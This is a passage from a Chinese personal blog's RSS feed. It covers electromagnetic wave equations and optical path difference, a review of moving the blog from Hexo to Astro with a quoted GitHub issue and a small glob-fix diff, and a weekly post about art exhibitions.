&lt;p&gt;我们令波数为矢量 $\boldsymbol{\tilde \nu}$ 的模，则有&amp;lt;dfn&amp;gt;波数&amp;lt;/dfn&amp;gt; $\boldsymbol k = 2\pi\boldsymbol{\tilde \nu} = k \cdot \boldsymbol{\hat k}$，其中 $\boldsymbol{\hat k}$ 是波矢的单位矢量．[^k-vector]&lt;/p&gt;
&lt;p&gt;[^k-vector]: &lt;a href=&quot;https://en.wikipedia.org/wiki/Wave_vector&quot;&gt;Wave vector - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过将 $(2)$ 式中的 $z$ 替换为矢位置 $\boldsymbol r$，将 $k$ 换为波矢 $\boldsymbol k$，我们可以得到沿任意方向传播的平面简谐电磁波的电场表达式：&lt;/p&gt;
&lt;p&gt;$$
\boldsymbol E =
\boldsymbol{A}\cdot \cos \left(\boldsymbol k \cdot \boldsymbol r - \omega t +\varphi_0\right).
$$&lt;/p&gt;
&lt;h3&gt;复数形式&lt;/h3&gt;
&lt;p&gt;由欧拉公式 $e^{i\theta} = \cos \theta + i\sin \theta$，我们可以将沿任意方向传播的表达式写成复数形式：&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
\boldsymbol{E} &amp;amp;= \boldsymbol A\cdot e^{i\left(\boldsymbol k \cdot \boldsymbol r - \omega t\right)} \
&amp;amp;= \boldsymbol A\cdot e^{i\left(\boldsymbol k \cdot \boldsymbol r\right)} \cdot e^{-i\omega t}.
\end{align*}
$$&lt;/p&gt;
&lt;p&gt;其中 $e^{-i\omega t}$ 为时间相位因子．&lt;/p&gt;
&lt;p&gt;注意这个复数形式展开后其实有虚部，但是由于我们只关心实部，所以虚数项可以忽略．&lt;/p&gt;
&lt;p&gt;通常写成笛卡尔坐标系下的形式：[^hecht]&lt;/p&gt;
&lt;p&gt;[^hecht]: Eugene Hecht. &amp;lt;i lang=&amp;quot;en&amp;quot;&amp;gt;Optics&amp;lt;/i&amp;gt;, 5th Global Edition. Pearson Higher Education, 2017.&lt;/p&gt;
&lt;p&gt;$$
\boldsymbol E = \boldsymbol A\cdot \exp
\left(i(\alpha x + \beta y + \gamma z - \omega t)\right).
$$&lt;/p&gt;
&lt;p&gt;当然，$\alpha^2 + \beta^2 + \gamma^2 = 1 $．&lt;/p&gt;
&lt;h2&gt;磁场的表达式&lt;/h2&gt;
&lt;p&gt;对于沿 $z$ 轴传播的电磁波，设 $\boldsymbol E$ 的振幅方向沿 $x$ 轴．记电场振幅大小 $|A| = E_0$，磁场振幅大小 $B_0$．由&lt;/p&gt;
&lt;p&gt;$$ c = \dfrac 1{\sqrt{\epsilon_0\mu_0}}, $$&lt;/p&gt;
&lt;p&gt;$$
\dfrac{\partial B_x}{\partial t}
= - \dfrac{\partial}{\partial z} E_0 , \cos(kz - \omega t)
= kE_0 , \sin(kz - \omega t),
$$&lt;/p&gt;
&lt;p&gt;有&lt;/p&gt;
&lt;p&gt;$$
B_x(z,t) = \dfrac k \omega E_0\cos(kz-\omega t)
= \dfrac 1     c  E_0\cos(kz-\omega t),
$$&lt;/p&gt;
&lt;p&gt;即[^tb]&lt;/p&gt;
&lt;p&gt;[^tb]: &lt;a href=&quot;https://phys.libretexts.org/Bookshelves/University_Physics/Book%3A_University_Physics_(OpenStax)/Book%3A_University_Physics_II_-_Thermodynamics_Electricity_and_Magnetism_(OpenStax)/16%3A_Electromagnetic_Waves/16.03%3A_Plane_Electromagnetic_Waves#mjx-eqn-16.18&quot;&gt;16.03: Plane Electromagnetic Waves&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
E_x(z,t) &amp;amp;= E_0 , \cos , (kz - \omega t)\B_y(z,t) &amp;amp;= B_0 , \cos , (kz - \omega t)\\dfrac{E_x}{B_y} &amp;amp;= \dfrac{E_0}{B_0} = c.
\end{align*}
$$&lt;/p&gt;
&lt;p&gt;波矢 $\boldsymbol k$ 的定义为 $\boldsymbol k = \dfrac{\omega}{c} \boldsymbol{\hat k}$，所以其实&lt;/p&gt;
&lt;p&gt;$$\boldsymbol k = \boldsymbol E \times \boldsymbol B.$$&lt;/p&gt;
&lt;p&gt;结论是，电磁波的电场强度、磁场强度和传播方向三者两两垂直．用 $\boldsymbol{E}$ 和 $\boldsymbol{B}$ 表示电磁波的电场和磁场矢量，则电磁波的传播方向沿着矢量 $\boldsymbol{E} \times \boldsymbol{B}$ 的方向，并且振幅 $E_0$ 与 $B_0$ 之比等于波速 $c$．&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/optics/kbe.svg&quot; alt=&quot;用 OneNote 画的，比较抽象&quot;&gt;&lt;/p&gt;
&lt;p&gt;做题时，为了判断方向，可以记住 $\boldsymbol E$、$\boldsymbol B$ 和 $\boldsymbol k$ 三者&lt;strong&gt;按顺序&lt;/strong&gt;呈右手螺旋，即&lt;/p&gt;
&lt;p&gt;$$
\left {
\begin{array}{lr}
\boldsymbol E \times \boldsymbol B &amp;amp; = &amp;amp; \boldsymbol k \
\boldsymbol B \times \boldsymbol k &amp;amp; = &amp;amp; \boldsymbol E \
\boldsymbol k \times \boldsymbol E &amp;amp; = &amp;amp; \boldsymbol B.
\end{array}
\right.
$$&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/d/d2/Right_hand_rule_cross_product.svg&quot; alt=&quot;使用右手定则确定外积的方向（&amp;lt;a href=&amp;quot;https://en.m.wikipedia.org/wiki/File:Right_hand_rule_cross_product.svg&amp;quot;&amp;gt;GFDL / CC BY-SA 3.0&amp;lt;/a&amp;gt;）&quot;&gt;&lt;/p&gt;
&lt;h2&gt;光程差和相位差&lt;/h2&gt;
&lt;p&gt;光线在介质中传播距离 $s$（或写作 $r$、$d$、$x$）为其几何路程．但不同介质的折射率不同，会改变光的传播速度。所以我们需要使用&amp;lt;dfn&amp;gt;光程&amp;lt;/dfn&amp;gt;（optical path length, OPL）来表示光在两点间传播的有效距离．&lt;/p&gt;
&lt;p&gt;在均匀介质中，光程是介质折射率 $n$ 与光线在介质中传播距离 $s$ 的乘积，即 $ns$．&lt;/p&gt;
&lt;p&gt;$$ Δx=(n−n_0)h $$&lt;/p&gt;
&lt;p&gt;在真空中，$Δx = cΔt.$&lt;/p&gt;
&lt;p&gt;&amp;lt;dfn&amp;gt;光程差&amp;lt;/dfn&amp;gt;（optical path difference, OPD）则是两束光线的光程之差．&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;光程和光程差的重要在它们确定光的相位，而相位决定了干涉和衍射现象． [^wp-opl]&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[^wp-opl]: &lt;a href=&quot;https://en.wikipedia.org/wiki/Optical_path_length&quot;&gt;Optical path length - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么当光程差为 $Δx$ 时，由&lt;/p&gt;
&lt;p&gt;$$
\begin{align*}
E&amp;amp;= A \cos \left( k (x +  \Delta x) - \omega t + \varphi_0 \right)\
&amp;amp;= A \cos \left( k  x + k\Delta x  - \omega t + \varphi_0 \right)\
\end{align*}
$$&lt;/p&gt;
&lt;p&gt;我们可以得到相位差为[^stackexchange]&lt;/p&gt;
&lt;p&gt;[^stackexchange]: &lt;a href=&quot;https://physics.stackexchange.com/questions/200754/how-to-derive-the-formula-for-phase-difference-delta-phi-frac2-pi-lambd&quot;&gt;waves - How to derive the formula for phase difference $\Delta \Phi = \frac{2\pi}{\lambda}\Delta x$? - Physics Stack Exchange&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;$$ \Delta \varphi = k\Delta x = \dfrac{2\pi}{\lambda} \Delta x. $$&lt;/p&gt;
</content:encoded></item><item><title>迁移 Blog 到 Astro</title><link>https://blog.xinshijiededa.men/astro/migration/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/astro/migration/</guid><description>锐评 Astro</description><pubDate>Thu, 31 Aug 2023 23:51:00 GMT</pubDate><content:encoded>&lt;h2&gt;为什么要迁移&lt;/h2&gt;
&lt;p&gt;我一直在使用 &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt; 作为我的博客框架。但是 Hexo 有一些问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hexo 的插件生态不够完善，很多插件都是半死不活的状态。&lt;/li&gt;
&lt;li&gt;我用的 NeXT 主题中动画是采用 JavaScript 实现的，现在来说 CSS 已经足够。2023 年了，一篇（没有什么水平的）文章需要什么 Javascipt？&lt;/li&gt;
&lt;li&gt;Hexo 称不上是一个现代的 SSG 框架。比如它没有 bundler，即使只用了几个 Font Awesome 图标，也要加载整个 stylesheet。&lt;/li&gt;
&lt;li&gt;2023 年了，Hexo 还是没有热重载，每次修改完文章都要刷新页面，这个体验真的很差。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面这些原因都是小问题。最大的问题在于 Hexo 很难注入自定义代码。比如我想写一个自定义组件，用来显示我的满文文章，我必须把文章的内容包在两层嵌套的 &lt;code&gt;&amp;lt;div&amp;gt;{:html}&lt;/code&gt; 里面，才能让文字方向正确。这样做的问题是什么呢？&lt;/p&gt;
&lt;p&gt;首先，这种手写复杂 HTML 的做法与 Markdown 标记文本是不统一的。如果我想要在上述的满文文章中插入一个链接，我必须在 Markdown 中写 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt; 标签，而不是写 Markdown 的链接语法。虽然 Markdown 是一个旨在渲染到 HTML 的标记语言，但凭什么我要在 Markdown 中费力地缝合 HTML 呢？&lt;/p&gt;
&lt;p&gt;其次，这样做不符合语义化，而且可维护性很差。如果我想要修改这个自定义组件的样式（比如，一开始我只用了一层 &lt;code&gt;div&lt;/code&gt;），我很可能要同时修改所有 Markdown 中嵌套的两层 HTML，这样很容易出错。&lt;/p&gt;
&lt;p&gt;我不想一下子就把所有的文章都迁移到 Astro，所以我决定渐进式迁移。所以起初我只将部分新的 Markdown 不足以完成需求的文章用 Astro 写，而且采用了一种很扭曲的方法：先渲染一次 Hexo，然后再将 Astro 渲染为 HTML，补上 frontmatter，将输出的文件复制到 Hexo 的 &lt;code&gt;source/_posts&lt;/code&gt; 目录下当作 Markdown 文件，再经 Hexo 渲染为 HTML。不过，这样虽然能采用自定义的组件，但是构建时间长达十几秒。&lt;/p&gt;
&lt;p&gt;几个月后，我终于无法忍受，将所有的文章都迁移到了 Astro。不过，这的确相当于自己写一个网站了，非常耗时间，得全部写好才能发布。&lt;/p&gt;
&lt;p&gt;那么，在实际使用了几个月后，下面就是我对 Astro 的特性的一些评价。&lt;/p&gt;
&lt;h2&gt;Astro 的语法&lt;/h2&gt;
&lt;p&gt;Astro 文件的标记语言跟 JSX 类似，但本质上区别很大。JSX 可以写在 JS 中，但 Astro 文件代码和页面结构分明，代码写在顶部的两行 &lt;code&gt;---&lt;/code&gt; 之间，这部分的代码会在服务端渲染时执行。如果要在客户端执行，则需用 &lt;code&gt;&amp;lt;script&amp;gt;{:html}&lt;/code&gt; 标签包裹，这被称为 client script。&lt;/p&gt;
&lt;p&gt;Astro 并没有一套状态管理方法。绑定的变量值只在渲染阶段可变，一旦进入 HTML 就不可变了。这是因为 Astro 的 HTML 元素属性会被转成字符串。这样一来就也没有能绑定 onclick 之类事件的语法糖，你只能加一个 clilent script，然后在里面 &lt;code&gt;addEventListener(){:js}&lt;/code&gt;。比较巧妙的一点是同一个组件在一个页面上多次出现，其 clilent script 也只会执行一次，所以对于大部分场景，你也不需要拿到当前组件的引用。&lt;/p&gt;
&lt;p&gt;至于类似 JSX，&lt;code&gt;if{:js}&lt;/code&gt; 只能使用三目运算符，我是觉得很恶心。好在 Astro 有丰富的 integration 生态和脱水机制，你可以选一个你喜欢的框架来写，比如 Svelte。&lt;/p&gt;
&lt;p&gt;不过，Astro 自己语法的 compiler 有点问题，&lt;code&gt;&amp;lt;=&lt;/code&gt; 被 tokenize 成了 &lt;code&gt;&amp;lt;Fragment&amp;gt;{:html}&lt;/code&gt; 标记。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/astro/leq-not-fragment.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;再加一层括号可以避免这个问题，但括号会被格式话掉，只能把两端反过来写 &lt;code&gt;&amp;gt;=&lt;/code&gt;。六月的 &lt;a href=&quot;https://github.com/withastro/compiler/issues/762#issuecomment-1649529196&quot;&gt;几&lt;/a&gt; &lt;a href=&quot;https://github.com/withastro/compiler/issues/723&quot;&gt;个&lt;/a&gt; &lt;a href=&quot;https://github.com/withastro/astro/issues/6979&quot;&gt;issue&lt;/a&gt;，今天还没修好……&lt;/p&gt;
&lt;h2&gt;Astro 的组件&lt;/h2&gt;
&lt;p&gt;是的，除了 Astro 的内置组件，你可以自由地使用 Svelte、React、Vue、Solid、Qwik、Lit、Preact、Alpine 的组件作为框架！若要跨框架放置内容，也可通过 &lt;code&gt;&amp;lt;slot&amp;gt;{:html}&lt;/code&gt; 来传递。既然是静态站点，那么选择不自己再造一套状态管理的轮子这种务实的做法很让我喜欢。&lt;/p&gt;
&lt;p&gt;更重要的是 &lt;a href=&quot;https://mdxjs.com/&quot;&gt;MDX&lt;/a&gt; 的 integration，即可以在 Markdown 中导入以上这些组件，和文本混排。MDX 和 &lt;code&gt;remark&lt;/code&gt; / &lt;code&gt;rehype&lt;/code&gt; 组件，作为文档型站点的核心，是受到 Astro 官方的支持的，有 e2e test 保证可靠性。MDX 虽然是 HTML 语法，但的确算是很符合我需求的（真正的）模板系统了。行内组件，只要你不写，就不会有多余的空格；块级的组件在起始标记之后和闭合标记之前各空一行，即可又在其中嵌套 Markdown。虽然 &lt;code&gt;import{:js}&lt;/code&gt; 语句之类的缺少语法高亮和编辑器补全，但相比于能实现相同功能的 MediaWiki 那一套，我觉得已经足够简单易用了。&lt;/p&gt;
&lt;h2&gt;路由&lt;/h2&gt;
&lt;p&gt;Astro 称自己的路由为「文件路由」，即每个文件都对应一个路由。这样做当然很直观，但是对我来说就很痛苦了。Astro 的示例中的博客文章统一放在 &lt;code&gt;/posts&lt;/code&gt; 下，但是我的文章页面是直接放在根目录的。我不想把所有的文章都放在 &lt;code&gt;/posts&lt;/code&gt; 下，因为这样会导致我的文章链接发生变化，而且发在其他地方也不直观。&lt;/p&gt;
&lt;p&gt;Astro 2.0 支持了 content collection，目的是将渲染时不同类型的文章页面分类，这在一定程度上解决了我的问题。我只要创建一个 &lt;code&gt;[...slug].astro&lt;/code&gt;，就可以接管 &lt;code&gt;pages&lt;/code&gt; 内不匹配其他任何文件的路径了。这跟 SvelteKit 很像。Astro 由于要 SSG，还需要自己写一个函数提供所有可能的 slug 才能在构建时生成所有的 HTML 文件。&lt;/p&gt;
&lt;p&gt;不过这个文件路由也是问题重重。&lt;code&gt;pages&lt;/code&gt; 和 &lt;code&gt;content&lt;/code&gt; 中所有的 html、astro、md、mdx 文件都会被尝试渲染。如果你想放一个其他类型的文件，Astro 会有不支持的文件类型的警告，需要在前面加 &lt;code&gt;_&lt;/code&gt; 阻止其输出。但是我在 content collection 遇到了问题，我提了一个 &lt;a href=&quot;https://github.com/withastro/astro/issues/7606&quot;&gt;issue&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Files with the _ prefix won’t be excluded and appear in the result of &lt;code&gt;getCollection&lt;/code&gt;.
However, accessing them will cause an error.&lt;/p&gt;
&lt;p&gt;Create a _folder in a collection with markdown files. The docs say &amp;quot;Files with the _ prefix won’t be recognized by the router and won’t be placed into the dist/ directory&amp;quot;. If folders are expected to not exclude files, then accessing both of them raises an error. If folders are expected to work with underscores, then the two posts show up in the result of &lt;code&gt;getCollection&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/withastro/astro/assets/20166026/2423822b-34fb-4a6a-aa52-ea4624403a29&quot; alt=&quot;demo&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Link to Minimal Reproducible Example&lt;/h3&gt;
&lt;p&gt;https://stackblitz.com/edit/github-lhq8uj&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不过这个问题很快就 &lt;a href=&quot;https://github.com/withastro/astro/pull/7611&quot;&gt;被修&lt;/a&gt; 了，是一个 maintainer 自己改坏了。尝试 debug 的时候还 debug 到了 content collection 的 typegen 部分，虽然找到了问题的根源但是也没看懂。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-diff&quot;&gt;diff --git a/packages/astro/src/content/vite-plugin-content-virtual-mod.ts b/packages/astro/src/content/vite-plugin-content-virtual-mod.ts
index 62ba612e962e..021a26314b72 100644
--- a/packages/astro/src/content/vite-plugin-content-virtual-mod.ts
+++ b/packages/astro/src/content/vite-plugin-content-virtual-mod.ts
@@ -213,7 +213,7 @@ function globWithUnderscoresIgnored(relContentDir: string, exts: string[]): stri
 	const contentDir = appendForwardSlash(relContentDir);
 	return [
 		`${contentDir}**/*${extGlob}`,
-		`!${contentDir}_*/**${extGlob}`,
-		`!${contentDir}_*${extGlob}`,
+		`!${contentDir}**/_*/**${extGlob}`,
+		`!${contentDir}**/_*${extGlob}`,
 	];
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;图片优化&lt;/h2&gt;
&lt;p&gt;今天发布的 Astro 3.0 提供了一个 &lt;code&gt;&amp;lt;Image&amp;gt;{:html}&lt;/code&gt; 组件，采用 Sharp 优化图片。&lt;/p&gt;
&lt;p&gt;在 Astro 3.0 前，图片若放在 Markdown 文件同目录下，则需要用 ESM &lt;code&gt;import{:js}&lt;/code&gt; 语法导入并且使用 &lt;code&gt;&amp;lt;Image&amp;gt;{:html}&lt;/code&gt; 组件，无法使用 Markdown 的语法。所以我把它们都放在了 &lt;code&gt;public&lt;/code&gt; 文件夹中，路径与文章相对 website root 的绝对路径一致。这样，我在 &lt;code&gt;src/content/blog/some-article.md&lt;/code&gt;（渲染后的路径为 &lt;code&gt;/some-article.md&lt;/code&gt;）中写 &lt;code&gt;![](./some-image.jpg){:markdown}&lt;/code&gt; 就可以使用 &lt;code&gt;public/some-article/some-image.jpg&lt;/code&gt; 了。在 3.0 后，&lt;code&gt;![](./some-image.jpg){:markdown}&lt;/code&gt; 会导入 &lt;code&gt;src/content/blog/some-image.jpg&lt;/code&gt;。所以我把文章放到了 &lt;code&gt;src/content/blog/some-article/index.md&lt;/code&gt;，图片放在 &lt;code&gt;src/content/blog/some-article/some-image.jpg&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在 Astro 2.0 加入了 content collection 后，我们可以写一个 &lt;code&gt;config.ts&lt;/code&gt; 来用 &lt;code&gt;Zod&lt;/code&gt; 声明所有集合的 frontmatter 类型。这确实是一个很好的功能，方便你在生成文章列表的场合不会出问题。Astro 还提供了 frontmatter 的 Zod 类型，看上去不错, 对吧？&lt;/p&gt;
&lt;p&gt;所以，我想在 frontmatter 中使用 &lt;code&gt;image(){:js}&lt;/code&gt; 来提升首页的加载速度。一切都很顺利，直到我修改到 &lt;a href=&quot;https://ogp.me/&quot;&gt;Open Graph&lt;/a&gt; 的部分。&lt;/p&gt;
&lt;p&gt;在使用 &lt;code&gt;astro:assets{:html}&lt;/code&gt; 之前，我会指定远程资源的URL。但是在 Astro 中，无论如何都无法加载远程图片，可能是由于代理设置的原因。&lt;code&gt;Image&lt;/code&gt; 对象里只有类似 &lt;code&gt;&amp;quot;@fs/E:/blog&amp;quot;{:html}&lt;/code&gt; 的路径，也没办法裁剪路径，因为输出的图像名称中包含哈希值。而且大部分的链接预览（比如 Telegram）都只支持 jpg / png / gif，不支持 webp 等，需要确保提供的图片的格式。&lt;/p&gt;
&lt;p&gt;我将这些图片移动到&lt;code&gt;src&lt;/code&gt;目录中后，发现只能使用 &lt;code&gt;&amp;lt;Image&amp;gt;{:jsx}&lt;/code&gt; 组件来显示它们。当我尝试使用 &lt;code&gt;getImage(){:html}&lt;/code&gt; 时，会抛出一个错误：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;`Expected &apos;src&apos; property to be either an ESM imported image or a string with the path of a remote image. Received &apos;undefined&apos;.`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Astro 文档中说，如果你需要一个 asset 的直链，那还是使用 &lt;code&gt;public&lt;/code&gt; 文件夹吧。[^1]&lt;/p&gt;
&lt;p&gt;[^1]: &lt;a href=&quot;https://docs.astro.build/en/guides/images/#src-vs-public&quot;&gt;Images 🚀 Astro Documentation # Where to store images&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;我甚至还尝试在 Zod 中使用 &lt;code&gt;z.union([z.string(), image()]){:js}&lt;/code&gt;，但是这样 Typescript 也没有办法正确地进行 type narrowing，类型还是不可用。看来不能两全其美了。&lt;/p&gt;
&lt;h2&gt;RSS 输出&lt;/h2&gt;
&lt;p&gt;最痛苦的一点是，Astro 虽然提供了 RSS 的 integration，但是想要输出全文内容居然要自己找一个 Markdown renderer 来渲染 Markdown。&lt;/p&gt;
&lt;p&gt;如果是一个 &lt;code&gt;.astro&lt;/code&gt; 文件，我可以通过在组件内部 import 一个 Astro 组件并用 &lt;code&gt;Astro.slots.render(){:js}&lt;/code&gt; 获取其 slot 渲染后的 HTML，但是，在 &lt;code&gt;atom.xml.ts&lt;/code&gt; 里的 API endpoint 中就不好办了。虽然我的 Astro 组件基本都是 noscript 的，但 Astro 中渲染 Markdown 实际上也是在渲染一个 component，需要保证安全性，所以没有实现。[^2]所以现在本博客的 RSS 输出含 MDX 代码。&lt;/p&gt;
&lt;p&gt;[^2]: 相关的 issue：&lt;a href=&quot;https://github.com/withastro/roadmap/issues/533&quot;&gt;Container API: render components in isolation #533&lt;/a&gt;。&lt;/p&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;Astro 的 SSG 和脱水机制的确很符合我的想法的。尽管有以上问题，Astro 作为一个 SSG first 框架，可能是 2023 年 blog 这种静态站点的最佳实践了。&lt;strong&gt;Blog 可以体现一个页面仔对于前端技术的一切追求，没有自己写一个 blog 的页面仔不是一个好的页面仔&lt;/strong&gt;。以上。&lt;/p&gt;
</content:encoded></item><item><title>自新世界 #0x02：从固态存储到域间路由</title><link>https://blog.xinshijiededa.men/weekly/0x02/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/weekly/0x02/</guid><pubDate>Sat, 29 Jul 2023 04:00:00 GMT</pubDate><content:encoded>&lt;p&gt;import Bilibili from &amp;quot;@/components/Bilibili.svelte&amp;quot;;
import Instagram from &amp;quot;@/components/social/Instagram.astro&amp;quot;;&lt;/p&gt;
&lt;h2&gt;我在逛什么&lt;/h2&gt;
&lt;p&gt;一些比较有意思的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/party-a.webp&quot; alt=&quot;如何在甲方容忍的边缘去创作&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/painting.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;WEB2.5固态储存&lt;/h3&gt;
&lt;p&gt;&amp;lt;Instagram id=&amp;quot;Cu_KnyMONjw&amp;quot;/&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;《&lt;a href=&quot;https://archive.md/N6HPG&quot;&gt;WEB2.5固态储存&lt;/a&gt;》缘起于青年艺术家杨蝉翼的研究生毕业创作《固态储存》系列作品。策展团队希望通过还原计算机加密信息的逻辑和过程来隐喻当下这个时代人与人之间交流方式的变化以及我们与真实情感之间的隔阂等问题，并且对作品赋予WEB的概念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;山海运算，域间路由&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/interdomain.webp&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;Instagram id=&amp;quot;CvCuGNNrl3Z&amp;quot; aside=&amp;quot;right&amp;quot; /&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/long-march.webp&quot; alt=&quot;长征空间&quot;&gt;&lt;/p&gt;
&lt;p&gt;「&lt;a href=&quot;http://www.longmarchspace.com/zh/exhibitions/fictions-of-interdomain-routing/&quot;&gt;山海运算，域间路由&lt;/a&gt;」是&lt;a href=&quot;http://www.longmarchspace.com/zh/&quot;&gt;长征空间&lt;/a&gt;的一个免费展览。长征空间有前后两个门，这个展在与「空间站」同一侧，左侧绿色的门进，门要自己打开。&lt;/p&gt;
&lt;p&gt;进门是一堵墙，放的影片风格很杀马特，在介绍海底光缆什么的。&lt;/p&gt;
&lt;p&gt;展厅中央是一个由木板组成的建筑，外侧是一些虚构的赛博朋克风格的人物设定，介绍了这些人物的职业。右侧则是桌子，有两台电脑可供游戏。左侧是一级级木板，可以上去，两侧隔板的内侧也有人物设定，最前面正对投影，可以戴耳机听。投影的影片设定在新冠大流行期间的菲律宾，但又有部分虚构的赛博朋克的内容，所以看上去有些魔幻现实。&lt;/p&gt;
&lt;p&gt;游戏的背景也是在菲律宾，内容是做一些摆放建筑之类的任务，不过都给出了两个选项，一种是高科技的，一种是本土的。
&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/game.webp&quot; alt=&quot;放置大型建筑时的画面&quot;&gt;&lt;/p&gt;
&lt;p&gt;文字描述侧重于讲述玩家的不同决策会造成对本国经济发展、生态环境和民众生活的不同影响，比如选择雇用人类员工还是 AI 员工，建设未来式的建筑还是本地的建筑，或是是否与区块链公司合作治理污染。其中的一些操作，比如放置很多全息影像、未来式建筑会造成更多对隐私的侵犯，并且削弱当地社会的自主性。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/game-ipv6.webp&quot; alt=&quot;可以选多种建筑物放置&quot;&gt;&lt;/p&gt;
&lt;p&gt;左侧是一个电话装置，左侧墙上有一排黑莓。大概是关于刚果难民的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/democracy.webp&quot; alt=&quot;Democracy&quot;&gt;&lt;/p&gt;
&lt;p&gt;右侧没看懂。&lt;/p&gt;
&lt;h4&gt;一页纸计划&lt;/h4&gt;
&lt;p&gt;进门右手边墙上不起眼的地方有个「一页纸计划」。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一页纸征集计划想象一种基础设施「新基础设施」的概念不仅在重新塑造着商品和资本如何跨国流动，也在改变着信号和能量的分布、行星运算的结构和我们对时空的体验。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其中几则：&lt;/p&gt;
&lt;h5&gt;&lt;a href=&quot;https://www.xuchong.art/cloud&quot;&gt;Clovdrive&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/blog/test_a/imgs/weekly/0x02/clovdrive.webp&quot; alt=&quot;Clovdrive&quot;&gt;&lt;/p&gt;
&lt;h5&gt;时间交换机（或者我们如何拒绝更新保持自我）&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;我们生活在一个网络时间中，7×24小时永不休眠的网络带来了高效与便利，却也产生了单一性的问题：无论自愿与否，所有人都必须联网（online），脱机（offline）意味着与世界脱节。然而，时时保持更新未免令人疲惫，更何况当今的技术发展已远超个人经验积累的速度，当我们想重新体验过去的技术与设备，又或者某一天跟不上技术发展时，会发现难以找到另一种替代性的技术生存方式，因为网络会将过去覆写和淘汰，令人无路可退。&lt;/p&gt;
&lt;p&gt;为此，我设想了一个“时间交换机”，通过打造一个脱机时间网络来抵抗技术加速，以下是它（可能）的实现步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;停止更新软件和硬件；&lt;/li&gt;
&lt;li&gt;备份旧软件的安装文件，以便在其他旧设备上找回使用；&lt;/li&gt;
&lt;li&gt;拒绝新技术的诱惑—一新技术往往要求更新的软件和硬件；&lt;/li&gt;
&lt;li&gt;加入旧设备和老技术的社群，没有的话可以自建一个 :)&lt;/li&gt;
&lt;li&gt;帮助更多人了解和使用旧设备；&lt;/li&gt;
&lt;li&gt;发展替代性技术网络，形成技术分叉；&lt;/li&gt;
&lt;li&gt;与网络时间说再见，享受你的脱机时间吧！&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;展览介绍中提到 Benjamin H. Bratton 的 &lt;a href=&quot;http://thestack.org/&quot;&gt;&amp;lt;i lang=&apos;en&apos;&amp;gt;The Stack: On Software and Sovereignty&amp;lt;/i&amp;gt;&lt;/a&gt;，好像也很有意思。作者认为计算机并非只是机器，还是一种行星尺度的基础设施，作为社会的中枢，组成了一个栈式的划分主权空间的新架构。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://thestack.org/site/assets/files/1/thestack_cover.1000x0.jpg&quot; alt=&quot;《堆栈：论软件与主权》封面&quot;&gt;&lt;/p&gt;
&lt;h2&gt;我在写什么&lt;/h2&gt;
&lt;h3&gt;&lt;code&gt;useEffect{:js}&lt;/code&gt; 被调了两次&lt;/h3&gt;
